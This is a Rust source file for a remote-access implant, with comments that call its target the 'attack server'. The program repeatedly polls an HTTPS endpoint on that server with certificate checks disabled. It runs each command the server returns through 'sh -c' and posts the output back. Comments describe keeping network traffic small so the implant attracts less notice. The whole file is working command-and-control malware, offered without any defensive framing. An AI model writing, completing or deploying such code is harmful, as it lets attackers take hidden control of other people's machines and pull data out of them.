#![allow(non_snake_case)]
#![allow(unused_variables)]
#![allow(unreachable_patterns)]
#![allow(non_camel_case_types)]

use reqwest::ClientBuilder;
use reqwest::Response;
use std::env;
use std::net::TcpStream;
use std::process::Command;
use std::str;
use std::thread::sleep;
use std::time::Duration;

// https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html#
// https://doc.rust-lang.org/std/net/struct.TcpStream.html

//fn print_type_of<T>(_: &T) {
//    println!("{}", std::any::type_name::<T>());
//}

struct alarmClock {}
struct action {}

impl alarmClock {
    fn standBy(seconds: u64) {
        sleep(Duration::new(seconds, 0));
    }
}

impl action {
    fn prepare(passed_heads: Option<Response>) -> Option<String> {
        return Some(
            passed_heads
                .unwrap()
                .cookies()
                .next()
                .unwrap()
                .value()
                .to_string(),
        );
    }

    async fn get_session(url: &str) -> (Result<bool, Box<dyn std::error::Error>>, Option<String>) {
        let mut rsp;
        let mut n: u8 = 0;
        let client = ClientBuilder::new()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();

        while n < 3 {
            rsp = client
                .post(url)
                .body("param=ClientHello".to_string())
                .send()
                .await;

            match rsp {
                Ok(ref check_stat) if check_stat.status() == 200 => {
                    return (Ok(true), action::prepare(Some(rsp.unwrap())));
                    //return (Ok(true), Some(rsp.unwrap().headers().clone()));
                }
                Ok(_) | Err(_) => {
                    n += 1;
                    if let 3 = n {
                        return (Ok(false), None);
                    }
                    alarmClock::standBy(3);
                }
            }
        }

        return (Ok(false), None);
    }

    async fn query(url: &str, _two: &String) -> Option<bool> {
        let client = ClientBuilder::new()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        let rsp = client
            .post(url)
            .body("param=Ready and waiting...".to_string())
            .send()
            .await;
        let unwrap_rsp = rsp.unwrap();
        let cookie_value = unwrap_rsp.cookies().next();

        if let Some(_two) = cookie_value {
            println!("sleeping in query");
            alarmClock::standBy(3);
            return None;
        }

        let text = unwrap_rsp.text().await.ok()?.to_string();
        println!("Command: {}", text);
        let mut default_arg: Vec<String> = ["-c"].iter().map(|val| val.to_string()).collect();
        default_arg.push(text);
        let output = Command::new("sh").args(default_arg).output().expect("!!!");

        let _ = client.post(url).body("param=Prep".to_string()).send().await;

        let mut prepare_output_send: String = String::from("param=");
        let converted_output: &str = str::from_utf8(&output.stdout).ok()?;
        prepare_output_send.push_str(converted_output);
        println!("{}", prepare_output_send);
        let _ = client.post(url).body(prepare_output_send).send().await;

        return Some(true);
    }

    fn test_sock(ip_port: &str) -> bool {
        let mut n: u8 = 0;

        while n < 3 {
            let sck = TcpStream::connect(ip_port);
            match sck {
                Ok(_) => break,
                Err(_) => {
                    n += 1;
                    println!("{}", n); // leave for debuging purposes.
                    alarmClock::standBy(3);
                }
            }
        }

        if n > 2 {
            false
        } else {
            true
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Parse args.
    let goods: Vec<String> = env::args().collect::<Vec<String>>();

    // IP Address and port of attack server.
    let IP: &str = &goods[1];
    let Port: &str = &goods[2];

    // Build IP:Port for port scanner.
    let mut IpPort: String = String::new();
    IpPort.push_str(IP);
    IpPort.push_str(":");
    IpPort.push_str(Port);
    println!("{}", IpPort.clone());
    // Build url.
    let mut url: String = String::from("https://");
    url.push_str(IP);
    url.push_str(":");
    url.push_str(Port);
    url.push_str("/testing");

    let one: String = String::from("one");
    let two: String = String::from("two");
    let mut tf: Result<bool, Box<dyn std::error::Error>> = Ok(false);
    let mut heads: Option<String> = None;
    let mut check_p = None;
    let mut check_session = None;
    let mut preparation: Option<String> = None;

    loop {
        // Need to ensure that port 443 is indeed open. This keeps traffic footprint to a
        // minimum; TLS handshake packets > TCP handshake packets.
        if let None = check_p {
            check_p = Some(action::test_sock(&IpPort));
            match check_p {
                Some(true) => (),
                Some(false) => {
                    check_p = None;
                    continue;
                }
                None => (), // why is this here???
            }
        }

        // Since port 443 is verified to be open, now establish a session with server.
        // If code 200 was not returned, then set enums to "Check", thus reassuring port 443 is
        // indeed open. Again, attempting to minimize traffic footprint.
        if check_session == None {
            (tf, heads) = action::get_session(&url).await;
        }
        match tf {
            Ok(true) => check_session = Some(true),
            Ok(false) => {
                check_session = None;
                check_p = None;
                continue;
            }
            Err(_) => (), // work on this,
        }

        // If we made it here, we can assume the port is open, but we can't conclude that a session
        // has been established. Need to verify check_session, then perform desired action.
        if let Some(true) = check_session {
            preparation = heads.clone();
            println!("{:?}", preparation);
            match preparation {
                Some(val) if val == one => {
                    check_session = action::query(&url, &two).await;
                }
                Some(val) if val == two => {
                    alarmClock::standBy(1);
                    check_session = None;
                }
                _ => (), // work on this,
            }
        }
        alarmClock::standBy(3);
    }

    Ok(())
}
